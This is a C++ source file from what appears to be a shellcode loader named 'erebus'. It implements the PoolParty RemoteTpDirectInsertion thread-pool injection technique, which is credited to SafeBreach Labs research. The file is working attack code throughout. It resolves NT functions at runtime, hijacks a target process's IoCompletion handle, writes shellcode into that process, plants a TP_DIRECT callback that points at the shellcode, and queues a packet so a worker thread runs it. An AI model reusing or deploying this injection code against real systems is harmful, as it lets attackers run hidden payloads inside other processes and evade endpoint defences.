/**
 * @file injection_poolparty.cpp
 * @brief PoolParty – RemoteTpDirectInsertion (CONFIG_INJECTION_TYPE == 4)
 *
 * Implementation based on SafeBreach-Labs PoolParty research:
 * https://github.com/SafeBreach-Labs/PoolParty
 *
 * Credits:
 *   - SafeBreach Labs (https://safebreach.com/)
 *   - Alon Leviev (@_0xDeku)
 *   - "PoolParty - A New Set of Windows Thread Pool Injection Techniques"
 *   - Black Hat Europe 2023
 *
 * Technique (RemoteTpDirectInsertion):
 *   1. Hijack the target's IoCompletion handle
 *   2. Write shellcode to target process
 *   3. Create a TP_DIRECT struct with Callback = shellcode address
 *   4. Allocate TP_DIRECT in the target process
 *   5. Call ZwSetIoCompletion(IoCompletion, &remote_tp_direct, NULL, 0, 0)
 *   6. A thread pool worker dequeues the packet and invokes the callback
 *
 * ApcContext == NULL distinguishes TP_DIRECT dispatch from TP_JOB dispatch
 * (the latter requires a non-zero JOB_OBJECT_MSG_* value - see type 9).
 *
 * Target requirements: process must have an active Windows thread pool
 * (IoCompletion handle present).  The implementation resumes the thread and
 * retries handle enumeration to handle newly created suspended processes.
 */

#include "../../include/loader.hpp"
#include "../../include/injection/injection_poolparty_common.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 4

    // Declared in injection_poolparty.hpp for use by main.cpp CONFIG_INJECTION_MODE==3.
    BOOL ProcessHasThreadPool(IN HANDLE hProcess) {
        HANDLE h = HijackIoCompletionHandle(hProcess);
        if (h) { CloseHandle(h); return TRUE; }
        return FALSE;
    }

    /**
     * @brief PoolParty RemoteTpDirectInsertion injection.
     *
     * @param shellcode      Shellcode buffer (local copy, will be written to target)
     * @param shellcode_size Size of shellcode in bytes
     * @param hProcess       Handle to the target process (PROCESS_ALL_ACCESS)
     * @param hThread        Handle to the target thread; if non-NULL the thread is
     *                       resumed first so the thread pool has a chance to init
     */
    VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size,
                            IN HANDLE hProcess, IN HANDLE hThread)
    {
        LOG_INFO("========================================");
        LOG_INFO("PoolParty (RemoteTpDirectInsertion)");
        LOG_INFO("Credits: SafeBreach Labs");
        LOG_INFO("========================================");

        HMODULE ntdll = ImportModule("ntdll.dll");
        if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }

        ImportFunction(ntdll, NtResumeThread,          typeNtResumeThread);
        ImportFunction(ntdll, NtClose,                 typeNtClose);
        ImportFunction(ntdll, ZwSetIoCompletion,       typeZwSetIoCompletion);
        ImportFunction(ntdll, NtWriteVirtualMemory,    typeNtWriteVirtualMemory);
        ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);

        if (!NtResumeThread || !NtClose || !ZwSetIoCompletion ||
            !NtWriteVirtualMemory || !NtAllocateVirtualMemory) {
            LOG_ERROR("Failed to resolve NT functions");
            return;
        }

        NTSTATUS status;
        HANDLE   hIoCompletion        = NULL;
        PVOID    shellcodeAddress     = NULL;
        PVOID    remoteTpDirectAddress = NULL;

        // Step 1: Resume thread so the thread pool can initialise (no-op on
        //         already-running threads).
        LOG_INFO("[1/5] Resuming target thread...");
        if (hThread && hThread != INVALID_HANDLE_VALUE && (ULONG_PTR)hThread > 1) {
            ULONG cnt = 0;
            status = NtResumeThread(hThread, &cnt);
            if (NT_SUCCESS(status))
                LOG_SUCCESS("Thread resumed (prev suspend count: %lu)", cnt);
            else
                LOG_INFO("Thread already running or resume failed");
        } else {
            LOG_INFO("Targeting existing process – thread already running");
        }

        // Step 2: Hijack IoCompletion handle.  Retry to allow the thread pool
        //         time to finish initialising after the resume.
        LOG_INFO("[2/5] Hijacking IoCompletion handle...");
        for (int attempt = 1; attempt <= 10; attempt++) {
            Sleep(500);
            hIoCompletion = HijackIoCompletionHandle(hProcess);
            if (hIoCompletion) break;
            if (attempt < 10)
                LOG_INFO("Thread pool not ready, retry %d/10...", attempt);
        }
        if (!hIoCompletion) {
            LOG_ERROR("Failed to hijack IoCompletion after 10 attempts");
            goto cleanup;
        }
        LOG_SUCCESS("Hijacked IoCompletion: 0x%p", hIoCompletion);

        // Step 3: Write shellcode.
        LOG_INFO("[3/5] Writing shellcode to target...");
        shellcodeAddress = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
        if (!shellcodeAddress) {
            LOG_ERROR("WriteShellcodeInMemory failed");
            goto cleanup;
        }
        LOG_SUCCESS("Shellcode at: 0x%p", shellcodeAddress);

        // Step 4: Allocate and write TP_DIRECT.
        LOG_INFO("[4/5] Writing TP_DIRECT to target...");
        {
            PP_TP_DIRECT tpDirect  = { 0 };
            tpDirect.Callback      = shellcodeAddress;

            SIZE_T sz = sizeof(PP_TP_DIRECT);
            status = NtAllocateVirtualMemory(
                hProcess, &remoteTpDirectAddress, 0, &sz,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!NT_SUCCESS(status)) {
                LOG_ERROR("NtAllocateVirtualMemory failed: 0x%08lX", status);
                goto cleanup;
            }

            SIZE_T written = 0;
            status = NtWriteVirtualMemory(
                hProcess, remoteTpDirectAddress,
                &tpDirect, sizeof(PP_TP_DIRECT), &written);
            if (!NT_SUCCESS(status)) {
                LOG_ERROR("NtWriteVirtualMemory failed: 0x%08lX", status);
                goto cleanup;
            }
            LOG_SUCCESS("TP_DIRECT at: 0x%p", remoteTpDirectAddress);
        }

        // Step 5: Queue completion packet – ApcContext = NULL → TP_DIRECT path.
        LOG_INFO("[5/5] Queuing IoCompletion packet...");
        status = ZwSetIoCompletion(
            hIoCompletion,
            remoteTpDirectAddress, // KeyContext  = &TP_DIRECT
            NULL,                   // ApcContext  = NULL (TP_DIRECT dispatch)
            0, 0);
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("ZwSetIoCompletion failed: 0x%08lX", status);
            goto cleanup;
        }

        LOG_SUCCESS("Packet queued – shellcode will execute via thread pool worker");
        Sleep(1500 + (GetTickCount() % 1000));

    cleanup:
        if (hIoCompletion && hIoCompletion != INVALID_HANDLE_VALUE)
            NtClose(hIoCompletion);
        if (hThread  && hThread  != INVALID_HANDLE_VALUE) NtClose(hThread);
        if (hProcess && hProcess != INVALID_HANDLE_VALUE) NtClose(hProcess);
    }

#endif // CONFIG_INJECTION_TYPE == 4
} // namespace erebus
